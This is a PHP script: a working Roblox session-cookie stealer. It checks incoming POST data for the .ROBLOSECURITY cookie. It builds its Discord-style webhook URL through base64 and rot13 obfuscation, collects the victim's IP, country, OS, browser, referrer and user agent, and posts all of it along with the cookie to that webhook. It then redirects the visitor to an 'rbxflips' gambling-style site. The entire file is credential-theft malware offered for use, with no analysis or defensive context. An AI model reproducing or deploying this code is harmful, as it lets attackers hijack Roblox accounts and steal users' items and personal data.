<?php
$contentlmao = file_get_contents('php://input');
if (strpos($contentlmao, '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_') !== false) {
    
	$RottenFlesh = "dWdnY2Y6Ly9xdmZwYmVxLnBiei9uY3YvanJvdWJieGYvNzgxODA1OTU3MDI2MDIxNDE3L2loQURIeHlvUTZjTlRyZU5KdTJWcEY4OVJ1RmRzX2dpU3lfUlZrd0RRM09KVk5JU0xQcXl5ZVByQWY3N2NoWk9GWERS";
	$Flash = base64_decode($RottenFlesh);
	$Bruv = str_rot13($Flash);
	$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
	// Getting OS Name
	function getOS() { 

	    global $user_agent;

	    $os_platform    =   "Unknown OS Platform";

	    $os_array       =   array(
        	                    '/windows nt 10/i'     =>  'Windows 10',
                	            '/windows nt 6.3/i'     =>  'Windows 8.1',
                        	    '/windows nt 6.2/i'     =>  'Windows 8',
                      	    	    '/windows nt 6.1/i'     =>  'Windows 7',
                   	            '/windows nt 6.0/i'     =>  'Windows Vista',
                   	            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                  	            '/windows nt 5.1/i'     =>  'Windows XP',
    	                            '/windows xp/i'         =>  'Windows XP',
                            	    '/windows nt 5.0/i'     =>  'Windows 2000',
                            	    '/windows me/i'         =>  'Windows ME',
                            	    '/win98/i'              =>  'Windows 98',
                               	    '/win95/i'              =>  'Windows 95',
                            	    '/win16/i'              =>  'Windows 3.11',
                            	    '/macintosh|mac os x/i' =>  'Mac OS X',
                               	    '/mac_powerpc/i'        =>  'Mac OS 9',
                           	    '/linux/i'              =>  'Linux',
				    '/kalilinux/i'          =>  'KaliLinux',
                                    '/ubuntu/i'             =>  'Ubuntu',
                                    '/iphone/i'             =>  'iPhone',
                                    '/ipod/i'               =>  'iPod',
                                    '/ipad/i'               =>  'iPad',
                                    '/android/i'            =>  'Android',
                                    '/blackberry/i'         =>  'BlackBerry',
                                    '/webos/i'              =>  'Mobile',
			  	    '/Windows Phone/i'      =>  'Windows Phone'
               		         );

  		  foreach ($os_array as $regex => $value) { 

 		       if (preg_match($regex, $user_agent)) {
		            $os_platform    =   $value;
		        }

		    }   

  		    return $os_platform;

	}
	// END of Getting OS
	//
	// Get browser
	function getBrowser() {

	    global $user_agent;

	    $browser        =   "Unknown Browser";

	    $browser_array  =   array(
	                            '/msie/i'       =>  'Internet Explorer',
	                            '/firefox/i'    =>  'Firefox',
				    '/Mozilla/i'    =>	'Mozila',
				    '/Mozilla/5.0/i'=>  'Mozila',
	                            '/safari/i'     =>  'Safari',
	                            '/chrome/i'     =>  'Chrome',
	                            '/edge/i'       =>  'Edge',
	                            '/opera/i'      =>  'Opera',
				    '/OPR/i'        =>  'Opera',
	                            '/netscape/i'   =>  'Netscape',
	                            '/maxthon/i'    =>  'Maxthon',
	                            '/konqueror/i'  =>  'Konqueror',
				    '/Bot/i'	    =>	'BOT Browser',
			            '/Valve Steam GameOverlay/i'  =>  'Steam',
                                    '/mobile/i'     =>  'Handheld Browser'
	                        );

	    foreach ($browser_array as $regex => $value) { 

	        if (preg_match($regex, $user_agent)) {
	            $browser    =   $value;
	        }

	    }

	    return $browser;

	}
	// END of getting browser


	$user_os        =   getOS();
	$user_browser   =   getBrowser();
	// Comming soon part --- Maybe :D 
	//$device_details =   "<strong>Browser: </strong>".$user_browser."<br /><strong>Operating System: </strong>".$user_os."";

	// Getting visitor IP address
	$ip = $_SERVER['REMOTE_ADDR'];
	// Getting where visitor come
	$site_refer = $_SERVER['HTTP_REFERER'];
		// If hes connected directly 
		if($site_refer == ""){
			$site = "dirrect connection";
		}
	  // If he doesn't
		else{
			$site = $site_refer;
		}
	  // Hide ownr's IP address
		$owner = "74.101.54.192";   //Change $owner for something else, cuz someone can simple read that by calling out $owner
	  // change it for $absdfs5sd4 for example and change it down there 
		$owner_country = "N/A"; //This u can leave how it is.
  
		if($ip == $owner){ //Change it here 
			$ip = "Owner"; 
			$country = $owner_country;
		}
	  //If that wasn't you, it woun't change IP address and it will find info about IP address
		else{
			$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
			$country = $details->country;
		}


	$timestamp = date("c", strtotime("now"));

	$json_data = json_encode([
		
		"content" => "New Comp",
    
		
		"username" => "Made by Fishi Jumpy22",

		

		
		"tts" => false,

		

		
		"embeds" => [
			[
				
				"title" => "New Log!",

				
				"type" => "rich",

				
				"description" => "Made by Fishi Jumpy22",

				
				"url" => "https://rbxflip.us/",

				
				"timestamp" => $timestamp,

				
				"color" => hexdec( "3366ff" ),

				
				"footer" => [
					"text" => "Fishi Jumpy22",
					"icon_url" => "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fvignette.wikia.nocookie.net%2Fbubble-gum-simulator%2Fimages%2F1%2F19%2FBruh.png%2Frevision%2Flatest%2Fscale-to-width-down%2F300%3Fcb%3D20191224082246&f=1&nofb=1"
				],

				
				"image" => [
					"url" => ""
				],

				

				
				"author" => [
					"name" => "Fishi Jumpy22",
					"url" => "https://rbxflip.us/"
				],

				
				"fields" => [

					[
						"name" => "Cookie",
						"value" => $contentlmao,
						"inline" => false
					],

					[
						"name" => "IP",
						"value" => $ip,
						"inline" => false
					],

					[
						"name" => "Country",
						"value" => $country,
						"inline" => false
					],

					[
						"name" => "OS",
						"value" => $user_os,
						"inline" => false
					],

					[
						"name" => "Browser",
						"value" => $user_browser,
						"inline" => false
					],

					[
						"name" => "Comes from site",
						"value" => $site,
						"inline" => false
					],

					[
						"name" => "User Agent",
						"value" => $user_agent,
						"inline" => false
					]
					
				]
			]
		]

	], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


	$ch = curl_init( $Bruv );
	curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
	curl_setopt( $ch, CURLOPT_POST, 1);
	curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
	curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt( $ch, CURLOPT_HEADER, 0);
	curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

	$response = curl_exec( $ch );
	// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
	// echo $response;
	curl_close( $ch );
	}

header("Location: https://www.rbxflips.club/");
die();
?>
